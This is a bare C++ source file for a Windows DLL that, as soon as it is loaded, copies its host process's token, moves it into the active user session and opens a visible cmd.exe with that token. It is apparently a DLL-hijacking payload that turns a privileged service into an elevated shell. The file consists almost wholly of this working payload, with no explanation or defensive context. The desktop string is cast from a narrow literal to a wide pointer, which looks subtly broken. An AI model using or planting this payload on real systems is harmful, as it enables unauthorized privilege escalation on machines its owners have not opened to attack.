#include <windows.h>
#include <Wtsapi32.h>


#pragma comment(lib, "Wtsapi32.lib")


DWORD GetFirstActiveSession()
{
	PWTS_SESSION_INFO sessions;
	DWORD count;

	if (WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, 
    &sessions, &count))
	{
		for (DWORD i = 0; i < count; ++i)
		{
			if (sessions[i].State == WTSActive)
			{
				return sessions[i].SessionId;
			}
		}
	}

	return 0xFFFFFFFF;
}

void StartProcess()
{
	STARTUPINFO startInfo = { 0 };
	PROCESS_INFORMATION procInfo = { 0 };

	startInfo.cb = sizeof(startInfo);

	HANDLE hToken;
	DWORD sessionId = GetFirstActiveSession();
	if (sessionId == 0xFFFFFFFF)
	{
		sessionId = WTSGetActiveConsoleSessionId();
	}

	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS,
    &hToken);

	DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr, 
    SecurityAnonymous, TokenPrimary, &hToken);

	if (sessionId != 0xFFFFFFFF)
	{
		SetTokenInformation(hToken, TokenSessionId, &sessionId,
        sizeof(sessionId));
	}

	startInfo.wShowWindow = SW_SHOW;
	startInfo.lpDesktop = (LPWSTR)"WinSta0\\Default";

	WCHAR cmdline[] = L"cmd.exe";

	CreateProcessAsUser(hToken, nullptr, cmdline, nullptr, nullptr, 
    FALSE, NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE,
		nullptr, nullptr, &startInfo, &procInfo);
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		StartProcess();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
